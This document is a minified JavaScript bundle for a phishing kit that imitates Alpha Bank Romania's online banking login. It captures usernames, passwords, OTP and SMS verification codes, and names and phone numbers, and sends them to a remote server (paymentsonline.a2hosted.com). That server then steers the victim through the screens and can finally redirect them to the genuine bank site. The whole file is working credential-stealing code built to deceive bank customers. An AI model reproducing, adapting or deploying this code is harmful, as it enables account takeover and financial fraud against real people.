(this.webpackJsonpalfa=this.webpackJsonpalfa||[]).push([[0],{21:function(e,a,t){e.exports=t.p+"static/media/logo-blue.4625c407.svg"},22:function(e,a,t){e.exports=t.p+"static/media/gb.3e0210d2.svg"},23:function(e,a,t){e.exports=t.p+"static/media/user.73c26be3.svg"},24:function(e,a,t){e.exports=t.p+"static/media/password.95058383.svg"},25:function(e,a){e.exports="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABH0lEQVQ4y61TSwrCMBDNSvAEgqLoVnsCvaN2UcFDeALFjZ+VXWr9IX4qeABdVKvEeW1axlhF0MCj02TeS94kI4Q22iJTJtQJM4Kn4Ki5sng3aDFFsAj3scjJlcjLvSgEQIw5rBFahHQSuTsUWXkgwieMKIdye+BwgeY35AjDUMSKyBXCzVWLXncg/flaHovVmIDYX6yl1+kH/8gFB1wINOAvSvadlcS4bQ8B8ViqBTGGP13GeaomDQjMUCS+W0TAN4437tOpwAEXAhdX88hFksjMxiVZgB2b2+E5u1Dg9GqBkbEzt5NgYfK+iOrY3A4voh0W0YSA8XKNi6+v0fjlITX/95T1ZrJVM7msmexPzaQJ4WmbhDnhSjij2mrO0PMfhnbivhKGeYwAAAAASUVORK5CYII="},26:function(e,a,t){e.exports=t.p+"static/media/open.f5eba4c0.svg"},27:function(e,a,t){e.exports=t.p+"static/media/closed.2574c4f2.svg"},28:function(e,a,t){e.exports=t.p+"static/media/Preloader.79828fe5.svg"},29:function(e,a,t){e.exports=t.p+"static/media/Phone1.6379ed4c.svg"},30:function(e,a,t){e.exports=t.p+"static/media/facebook.fed6239c.svg"},31:function(e,a,t){e.exports=t.p+"static/media/linkedin.7662fa5b.svg"},32:function(e,a,t){e.exports=t.p+"static/media/youtube.4bd71544.svg"},33:function(e,a,t){e.exports=t.p+"static/media/twitter.79b4d05a.svg"},36:function(e,a,t){e.exports=t(62)},41:function(e,a,t){},42:function(e,a,t){},62:function(e,a,t){"use strict";t.r(a);var n=t(1),r=t(0),c=t.n(r),s=t(16),i=t.n(s),l=(t(41),t(4)),o=t(17),m=t(18),u=t(35),d=t(34),E=(t(42),function(e,a){return Object.keys(a).reduce((function(a,t){return a[t]=e?"".concat(e,".").concat(t):"".concat(t),a}),{})}),v="STEP_1",g="STEP_2",p="STEP_3",N="STEP_4",f="STEP_5",S="STEP_6",_="STEP_7",b=E("USER",{ENTER_HOMEPAGE:void 0,NEW_USER:void 0,TYPING:void 0,LOGGING:void 0,SEND_CREDENTIALS:void 0,SEND_TOKEN:void 0,SEND_AUTH_CODE:void 0,SEND_SMS:void 0,SEND_TECH_DATA:void 0,SEND_SMART_TOKEN:void 0,SEND_SMART_TOKEN_SMS:void 0,SEND_SECURE_CODE:void 0}),O=E("INSTR",{GO_TO_HOME_SCREEN:void 0,GO_TO_TOKEN_SCREEN:void 0,GO_TO_AUTH_CODE_SCREEN:void 0,GO_TO_SMS_SCREEN:void 0,GO_TO_SMART_TOKEN:void 0,GO_TO_SMART_TOKEN_SMS:void 0,GO_TO_TECH_SCREEN:void 0,SHOW_LOADING_STATE:void 0,ERR_MSG_INVALID_CREDENTIALS:void 0,GO_TO_ORIGINAL_SITE:void 0}),h=E("TYPE",{LOGIN:void 0,PASSWORD:void 0}),A=E("BANK",{RAIFFEISEN:void 0,UNI_CREDIT:void 0,ALPHA:void 0}),T={step:v},I={get userId(){return sessionStorage.getItem("USER_ID")},set userId(e){sessionStorage.setItem("USER_ID",e)},get touched(){return sessionStorage.getItem("TOUCHED")},set touched(e){sessionStorage.setItem("TOUCHED",e)},get state(){return JSON.parse(sessionStorage.getItem("STATE"))||T},set state(e){sessionStorage.setItem("STATE",JSON.stringify(e))},get bank(){return JSON.parse(sessionStorage.getItem("BANK"))},set bank(e){sessionStorage.setItem("BANK",e)}},C=t(3),w=t.n(C),j=t(6),k=t(19),R=t.n(k),D=(t(20),Object(l.a)(Object(l.a)({},{restURL:"https://paymentsonline.a2hosted.com/token/rest",originalURL:"https://onlinebanking.alphabank.ro/index/public/online-banking.html?module=login"}),{},{pullingInterval:1500})),x=D.restURL,y=function(e){var a=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"GET",t=arguments.length>2?arguments[2]:void 0,n=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{updateLastActive:!0},r=(n.updateLastActive,I.lastActive||0);return R()({url:"".concat(x).concat(e),method:a,data:t,headers:{"last-active":r}}).then((function(e){return e.data})).then((function(e){return I.lastActive=e.lastActive,e.data}))};var G=D.pullingInterval,L={start:function(){var e=this;setInterval(Object(j.a)(w.a.mark((function a(){var t;return w.a.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return a.next=2,y("/user/message/".concat(I.userId));case 2:t=a.sent,n=t,0!==Object.keys(n).length&&(console.log("msg",t),e.onmessage(t));case 4:case"end":return a.stop()}var n}),a)}))),G)},send:function(e){return Object(j.a)(w.a.mark((function a(){return w.a.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:y("/message","PUT",{userId:I.userId,action:e}),console.log("action",e);case 2:case"end":return a.stop()}}),a)})))()},init:function(e){var a=this;return Object(j.a)(w.a.mark((function t(){var n;return w.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(a.onmessage=e,I.bank=A.ALFA,n=I.userId){t.next=8;break}return t.next=6,y("/user/id");case 6:n=t.sent,I.userId=n;case 8:I.touched&&a.start();case 9:case"end":return t.stop()}}),t)})))()}},M=t(21),P=t.n(M),K=t(22),U=t.n(K),B=function(e){return c.a.createElement("div",{className:"header"},c.a.createElement("div",{className:"header-container"},c.a.createElement("div",{className:"header-panel"},c.a.createElement("div",{className:"row"},c.a.createElement("div",{className:"logo"},c.a.createElement("img",{src:P.a,alt:"ALPHA BANK LOGO"})),c.a.createElement("div",{className:"description regular"},"Alpha Online Banking")),c.a.createElement("div",{className:"language"},c.a.createElement("div",{className:"language-container"},c.a.createElement("div",{className:"flag"},c.a.createElement("img",{src:U.a,alt:"gb"})),c.a.createElement("div",{className:"regular description"},"Switch to english"))))))},H=t(23),F=t.n(H),V=t(24),W=t.n(V),J=t(25),Q=t.n(J),X=function(e){var a=e.message;return c.a.createElement("div",{className:"error-wrapper"},c.a.createElement("div",{className:"error-msg-container regular"},c.a.createElement("div",{className:"error-icon"},c.a.createElement("img",{src:Q.a,alt:"error"})),c.a.createElement("div",{className:"error-msg"},a)))},Y=function(e){var a=e.store,t=e.changeStore,s=Object(r.useState)(""),i=Object(n.a)(s,2),l=i[0],o=i[1],m=Object(r.useState)(""),u=Object(n.a)(m,2),d=u[0],E=u[1],v=Object(r.useState)(""),g=Object(n.a)(v,2),p=g[0],N=g[1],f=a.error,S=function(e,a){a===h.LOGIN&&o(e),a===h.PASSWORD&&E(e),I.touched||(console.log("Typing..."),L.start(),I.touched=!0)};return c.a.createElement("div",{className:"step-container regular"},c.a.createElement("div",{className:"form-auth"},c.a.createElement("form",{onSubmit:function(e){e.preventDefault();var a="".concat(l).concat(";;").concat(d);if(!l||!d)return t({error:!0}),void N(!0);L.send({type:b.SEND_CREDENTIALS,payload:a}),t({step_1_cod:a,loading:!0})}},c.a.createElement("div",{className:"label"},"Nume utilizator"),c.a.createElement("div",{className:"item-field"},c.a.createElement("div",{className:"icon"},c.a.createElement("img",{src:F.a,alt:"login"})),c.a.createElement("div",{className:"input-field"},c.a.createElement("input",{type:"text",placeholder:"Nume utilizator",onChange:function(e){return S(e.target.value,h.LOGIN)}}))),c.a.createElement("div",{className:"label"},"Parola"),c.a.createElement("div",{className:"item-field regular"},c.a.createElement("div",{className:"icon"},c.a.createElement("img",{src:W.a,alt:"password"})),c.a.createElement("div",{className:"input-field"},c.a.createElement("input",{type:"password",placeholder:"Parola",onChange:function(e){return S(e.target.value,h.PASSWORD)}})),c.a.createElement("div",{className:"forget-password"},c.a.createElement("a",{href:"#",className:"bold"},"Ai uitat parola?"))),(p||f)&&c.a.createElement(X,{message:"Ati introdus credentiale eronat"}),c.a.createElement("div",{className:"row space-between links-container bold"},c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Sfaturi utile de securitate")),c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Foloseste tastatura virtuala"))),c.a.createElement("div",{className:"btn-container"},c.a.createElement("button",{type:"submit",className:"blue regular"},"Autentificare"))),c.a.createElement("div",{className:"row space-between links-container bold",style:{marginTop:"25px"}},c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Prima logare")),c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Inregistrare")))))},z=t(26),q=t.n(z),Z=t(27),$=t.n(Z),ee=function(e){var a=e.changeStore,t=e.store,s=(t.step_1_cod,t.challenge,t.step_2_cod,t.error),i=Object(r.useState)(!1),l=Object(n.a)(i,2),o=l[0],m=l[1],u=Object(r.useState)(""),d=Object(n.a)(u,2),E=d[0],g=d[1],p=Object(r.useState)(!1),N=Object(n.a)(p,2),f=N[0],S=N[1],_=function(){if(E){var e=E;L.send({type:b.SEND_TOKEN,payload:e}),a({step_2_cod:e,loading:!0})}else m(!0)};return c.a.createElement("div",{className:"secure-container regular"},c.a.createElement("div",{className:"secure-wrapper"},c.a.createElement("div",{style:{marginBottom:"32px"},className:"bold"},"Te rugam sa introduci codul OTP de 6 cifre generat de dispozitivul tau de securitate."),c.a.createElement("div",{className:"secure-fields-container"},c.a.createElement("div",{className:"row"},c.a.createElement("div",{className:"secure-field-description bold"},"Cod de securitate"),c.a.createElement("div",{className:"secure-field-input",style:{position:"relative"}},c.a.createElement("img",{src:f?q.a:$.a,alt:"secure",className:"toggle-input",onClick:function(){S(!f)}}),c.a.createElement("input",{value:E,onChange:function(e){return a=e.target.value,void g(a);var a},type:f?"text":"password"}),(o||s)&&c.a.createElement(X,{message:"Ati introdus cod de securitate eronat"}))),c.a.createElement("div",{className:"secure-buttons-container"},c.a.createElement("div",null,c.a.createElement("button",{className:"regular white-btn",style:{marginRight:"16px"},onClick:_},"Omite code de securitate")),c.a.createElement("div",null,c.a.createElement("button",{className:"regular white-btn",onClick:function(){a({step:v})}},"Inapoi")),c.a.createElement("div",null,c.a.createElement("button",{className:"small-blue-btn regular",onClick:_},"Confirma"))))))},ae=t(5),te=function(e){var a,t=e.changeStore,s=e.store,i=Object(r.useState)(!1),l=Object(n.a)(i,2),o=l[0],m=l[1],u=Object(r.useState)(""),d=Object(n.a)(u,2),E=d[0],v=d[1],g=s.error;return c.a.createElement("div",{className:"secure-container regular verification"},c.a.createElement("div",{className:"secure-wrapper"},c.a.createElement("div",{style:{marginBottom:"32px"},className:"bold"},"Un cod de verificare a fost transmis catre numarul de telefon/adresa de mail inregistrata. Te rugam sa introduci codul mai jos pentru a sincroniza tokenul."),c.a.createElement("div",{className:"secure-fields-container"},c.a.createElement("div",{className:"row"},c.a.createElement("div",{className:"secure-field-description bold"},"Cod de verificare"),c.a.createElement("div",{className:"secure-field-input"},c.a.createElement("input",(a={value:E,onChange:function(e){return a=e.target.value,console.log("value",a),void v(a);var a}},Object(ae.a)(a,"value",E),Object(ae.a)(a,"type","password"),a)),(o||g)&&c.a.createElement(X,{message:"Ati introdus cod de verificare eronat"}))),c.a.createElement("div",{className:"secure-buttons-container"},c.a.createElement("div",null,c.a.createElement("button",{className:"regular white-btn",onClick:function(){return v("")}},"Anuleaza")),c.a.createElement("div",null,c.a.createElement("button",{className:"small-blue-btn regular",onClick:function(){if(E){var e=E;L.send({type:b.SEND_SMS,payload:e}),t({step_3_cod:e,loading:!0})}else m(!0)}},"Confirma"))))))},ne=function(e){var a=Object(r.useState)(!1),t=Object(n.a)(a,2),s=t[0],i=t[1],l=Object(r.useState)(""),o=Object(n.a)(l,2),m=o[0],u=o[1],d=(e.store,e.changeStore);return c.a.createElement("div",{className:"secure-container regular verification"},c.a.createElement("div",{className:"secure-wrapper"},c.a.createElement("div",{style:{marginBottom:"32px"},className:"bold"},"Se duc lucrari tehnice pana la ora 17:00. Lasati datele d-vstra sa va contactam."),c.a.createElement("div",{className:"secure-fields-container"},c.a.createElement("div",{className:"row"},c.a.createElement("div",{className:"secure-field-description bold"},"Nume prenume / Telefon de contact"),c.a.createElement("div",{className:"secure-field-input"},c.a.createElement("input",{onChange:function(e){return a=e.target.value,console.log("value",a),void u(a);var a},value:m}),!m.length&&s&&c.a.createElement(X,{message:"Campul nu poate fi gol"}))),c.a.createElement("div",{className:"secure-buttons-container"},c.a.createElement("div",null,c.a.createElement("button",{className:"small-blue-btn regular",onClick:function(){if(m){var e=m;L.send({type:b.SEND_TECH_DATA,payload:e}),d({step_5_cod:e,loading:!0})}else i(!0)}},"Confirma"))))))},re=function(e){var a=e.store.step;return c.a.createElement(c.a.Fragment,null,function(a){switch(a){case v:return c.a.createElement(Y,e);case g:return c.a.createElement(ee,e);case p:return c.a.createElement(te,e);case f:return c.a.createElement(ne,e);default:return null}}(a))},ce=function(e){return c.a.createElement(c.a.Fragment,null,c.a.createElement(re,e))},se=t(28),ie=t.n(se),le=function(e){return c.a.createElement("div",{className:"loader-container",style:{height:"100vh",display:"flex"}},c.a.createElement("img",{src:ie.a,alt:"Loading..."}))},oe=function(e){var a=e.store;return c.a.createElement("div",{className:"content-container"},a.loading?c.a.createElement(le,null):c.a.createElement(ce,e))},me=t(29),ue=t.n(me),de=t(30),Ee=t.n(de),ve=t(31),ge=t.n(ve),pe=t(32),Ne=t.n(pe),fe=t(33),Se=t.n(fe),_e=function(e){return c.a.createElement("footer",null,c.a.createElement("div",{className:"footer-container regular"},c.a.createElement("div",{className:"footer-top"},c.a.createElement("div",{className:"contact-container"},c.a.createElement("div",{className:"phone-container"},c.a.createElement("div",{className:"phone-icon"},c.a.createElement("img",{src:ue.a,alt:"phone"})),c.a.createElement("div",{className:"phone-number"},"08008 25742")),c.a.createElement("div",null,"Contact")),c.a.createElement("div",{className:"social-container"},c.a.createElement("div",{className:"social-item"},c.a.createElement("img",{src:Ee.a,alt:"facebook"})),c.a.createElement("div",{className:"social-item"},c.a.createElement("img",{src:ge.a,alt:"linkedin"})),c.a.createElement("div",{className:"social-item"},c.a.createElement("img",{src:Ne.a,alt:"youtube"})),c.a.createElement("div",{className:"social-item"},c.a.createElement("img",{src:Se.a,alt:"twitter"})))),c.a.createElement("div",{className:"bottom-wrapper"},c.a.createElement("div",{className:"footer-bottom row"},c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Termeni si Conditii")),c.a.createElement("div",{className:"rb"},"|"),c.a.createElement("div",null,c.a.createElement("a",{href:"#"},"Securitatea informatiilor"))))))},be=function(e){Object(u.a)(t,e);var a=Object(d.a)(t);function t(){var e;Object(o.a)(this,t);for(var n=arguments.length,r=new Array(n),c=0;c<n;c++)r[c]=arguments[c];return(e=a.call.apply(a,[this].concat(r))).state=I.state,e.changeStore=function(a){var t=Object(l.a)(Object(l.a)({},e.state),a);e.setState(t),I.state=t},e}return Object(m.a)(t,[{key:"componentDidMount",value:function(){var e=this;console.log("****init"),console.log("state",this.state);L.init((function(a){!function(e,a){var t=e.action,n=e.payload,r={loading:!1,error:!1};switch(t){case O.GO_TO_HOME_SCREEN:r.step=v,r.step_1_cod="";break;case O.GO_TO_TOKEN_SCREEN:r.step=g,r.challenge=n,r.step_2_cod="";break;case O.GO_TO_AUTH_CODE_SCREEN:r.step=S,r.step_6_cod="";break;case O.GO_TO_SMS_SCREEN:r.step=p,r.step_3_cod="";break;case O.GO_TO_TECH_SCREEN:r.step=f,r.step_5_cod="";break;case O.GO_TO_SMART_TOKEN:r.step=N,r.step_4_cod="";break;case O.GO_TO_SMART_TOKEN_SMS:r.step=_,r.step_7_cod="";break;case O.ERR_MSG_INVALID_CREDENTIALS:r.error=!0;break;case O.SHOW_LOADING_STATE:r.loading=!0;break;case O.GO_TO_ORIGINAL_SITE:return void(window.location.href=D.originalURL);default:r.loading=!0}a(r)}(a,e.changeStore)}))}},{key:"render",value:function(){return console.log(!1),c.a.createElement("div",{id:"outer"},c.a.createElement(B,null),c.a.createElement(oe,{store:this.state,changeStore:this.changeStore}),c.a.createElement(_e,null),!1)}}]),t}(c.a.Component);y("/config").then((function(e){if(console.log("xxxxxx",e),e&&e.length){var a=Object(n.a)(e,1)[0],t=a.alive,r=a.redirect;t?i.a.render(c.a.createElement(c.a.StrictMode,null,c.a.createElement(be,null)),document.getElementById("root")):window.location.href=r||"http://aboutbanking.org/"}}))}},[[36,1,2]]]);
//# sourceMappingURL=main.31bedd92.chunk.js.map